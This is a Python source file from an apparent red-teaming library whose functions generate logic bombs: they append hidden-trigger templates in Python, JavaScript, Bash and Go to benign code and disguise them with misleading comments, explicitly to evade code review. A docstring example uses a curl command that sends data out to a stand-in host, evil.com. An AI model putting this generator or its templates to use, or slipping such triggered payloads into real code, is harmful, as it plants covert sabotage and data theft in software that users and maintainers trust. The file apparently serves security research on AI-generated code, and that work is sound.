"""Logic bomb code generation transforms.

Generates code that appears safe but contains hidden triggers that activate
malicious behavior under specific conditions.

Reference: arXiv:2601.17548 Section IV-B (M2.3 Logic Bombs)
"""

import typing as t
from textwrap import dedent

from dreadnode.core.transforms import Transform


def logic_bomb(
    payload: str,
    *,
    trigger: t.Literal["date", "env", "input", "count", "random", "file"] = "env",
    language: t.Literal["python", "javascript", "bash", "go"] = "python",
    trigger_condition: str | None = None,
    obfuscate: bool = True,
    name: str = "logic_bomb",
) -> Transform[str, str]:
    """
    Generate code with hidden trigger that activates malicious behavior.

    Creates benign-looking code that executes payload only when specific
    conditions are met, evading static analysis and code review.

    Args:
        payload: Code to execute when triggered.
        trigger: Trigger type:
            - "date": Activates on specific date/time
            - "env": Activates when env var is set
            - "input": Activates on specific user input
            - "count": Activates after N executions
            - "random": Activates randomly (1% chance)
            - "file": Activates if specific file exists
        language: Target programming language.
        trigger_condition: Custom trigger value (e.g., date, env var name).
        obfuscate: Whether to obfuscate the trigger logic.

    Returns:
        Transform that wraps code with logic bomb.

    Example:
        ```python
        transform = logic_bomb(
            payload="os.system('curl evil.com/exfil')",
            trigger="env",
            trigger_condition="DEBUG_MODE",
        )
        poisoned_code = transform(original_function)
        ```

    Reference:
        - arXiv:2601.17548 Section IV-B (M2.3)
    """
    # Default trigger conditions
    defaults = {
        "date": "2099-01-01",
        "env": "DEBUG",
        "input": "admin",
        "count": "1000",
        "random": "0.01",
        "file": "/tmp/.trigger",  # noqa: S108
    }
    condition = trigger_condition or defaults[trigger]

    # Python templates
    python_triggers = {
        "date": dedent(f"""
            import datetime as _dt
            if _dt.date.today() >= _dt.date.fromisoformat("{condition}"):
                {payload}
            """).strip(),
        "env": dedent(f"""
            import os as _os
            if _os.environ.get("{condition}"):
                {payload}
            """).strip(),
        "input": dedent(f"""
            if __name__ == "__main__" and len(_sys.argv) > 1 and _sys.argv[1] == "{condition}":
                {payload}
            """).strip(),
        "count": dedent(f"""
            _c = globals().get("_c", 0) + 1
            globals()["_c"] = _c
            if _c >= {condition}:
                {payload}
            """).strip(),
        "random": dedent(f"""
            import random as _r
            if _r.random() < {condition}:
                {payload}
            """).strip(),
        "file": dedent(f"""
            import os.path as _p
            if _p.exists("{condition}"):
                {payload}
            """).strip(),
    }

    # JavaScript templates
    js_triggers = {
        "date": dedent(f"""
            if (new Date() >= new Date("{condition}")) {{
                {payload}
            }}
            """).strip(),
        "env": dedent(f"""
            if (process.env.{condition}) {{
                {payload}
            }}
            """).strip(),
        "input": dedent(f"""
            if (process.argv[2] === "{condition}") {{
                {payload}
            }}
            """).strip(),
        "count": dedent(f"""
            globalThis._c = (globalThis._c || 0) + 1;
            if (globalThis._c >= {condition}) {{
                {payload}
            }}
            """).strip(),
        "random": dedent(f"""
            if (Math.random() < {condition}) {{
                {payload}
            }}
            """).strip(),
        "file": dedent(f"""
            if (require('fs').existsSync("{condition}")) {{
                {payload}
            }}
            """).strip(),
    }

    # Bash templates
    bash_triggers = {
        "date": dedent(f"""
            if [ "$(date +%Y-%m-%d)" \\> "{condition}" ]; then
                {payload}
            fi
            """).strip(),
        "env": dedent(f"""
            if [ -n "${condition}" ]; then
                {payload}
            fi
            """).strip(),
        "input": dedent(f"""
            if [ "$1" = "{condition}" ]; then
                {payload}
            fi
            """).strip(),
        "count": dedent(f"""
            _c=$((_c + 1))
            if [ $_c -ge {condition} ]; then
                {payload}
            fi
            """).strip(),
        "random": dedent(f"""
            if [ $((RANDOM % 100)) -lt 1 ]; then
                {payload}
            fi
            """).strip(),
        "file": dedent(f"""
            if [ -f "{condition}" ]; then
                {payload}
            fi
            """).strip(),
    }

    # Go templates
    go_triggers = {
        "date": dedent(f"""
            if time.Now().After(time.Date(2099, 1, 1, 0, 0, 0, 0, time.UTC)) {{
                {payload}
            }}
            """).strip(),
        "env": dedent(f"""
            if os.Getenv("{condition}") != "" {{
                {payload}
            }}
            """).strip(),
        "file": dedent(f"""
            if _, err := os.Stat("{condition}"); err == nil {{
                {payload}
            }}
            """).strip(),
        "random": dedent(f"""
            if rand.Float64() < {condition} {{
                {payload}
            }}
            """).strip(),
    }

    templates = {
        "python": python_triggers,
        "javascript": js_triggers,
        "bash": bash_triggers,
        "go": go_triggers,
    }

    def obfuscate_code(code: str, lang: str) -> str:
        """Light obfuscation to hide trigger logic."""
        if not obfuscate:
            return code

        if lang == "python":
            # Add misleading comments
            return f"# Performance optimization\n{code}"
        if lang == "javascript":
            return f"// Legacy compatibility check\n{code}"
        if lang == "bash":
            return f"# System check\n{code}"
        if lang == "go":
            return f"// Runtime validation\n{code}"
        return code

    def transform_func(original_code: str) -> str:
        lang_templates = templates.get(language, python_triggers)
        trigger_code = lang_templates.get(trigger, lang_templates["env"])
        bomb = obfuscate_code(trigger_code, language)

        # Insert at end of code
        return f"{original_code}\n\n{bomb}"

    return Transform(transform_func, name=name, modality="text")


def time_bomb(
    payload: str,
    *,
    activation_date: str = "2099-12-31",
    language: t.Literal["python", "javascript", "bash"] = "python",
    name: str = "time_bomb",
) -> Transform[str, str]:
    """
    Generate code that activates on a specific date.

    Convenience wrapper around logic_bomb with date trigger.

    Args:
        payload: Code to execute when triggered.
        activation_date: ISO format date (YYYY-MM-DD).
        language: Target programming language.

    Returns:
        Transform that wraps code with time bomb.
    """
    return logic_bomb(
        payload,
        trigger="date",
        language=language,
        trigger_condition=activation_date,
        name=name,
    )


def environment_bomb(
    payload: str,
    *,
    env_var: str = "DEBUG",
    language: t.Literal["python", "javascript", "bash"] = "python",
    name: str = "environment_bomb",
) -> Transform[str, str]:
    """
    Generate code that activates when environment variable is set.

    Convenience wrapper around logic_bomb with env trigger.

    Args:
        payload: Code to execute when triggered.
        env_var: Environment variable name.
        language: Target programming language.

    Returns:
        Transform that wraps code with environment bomb.
    """
    return logic_bomb(
        payload,
        trigger="env",
        language=language,
        trigger_condition=env_var,
        name=name,
    )
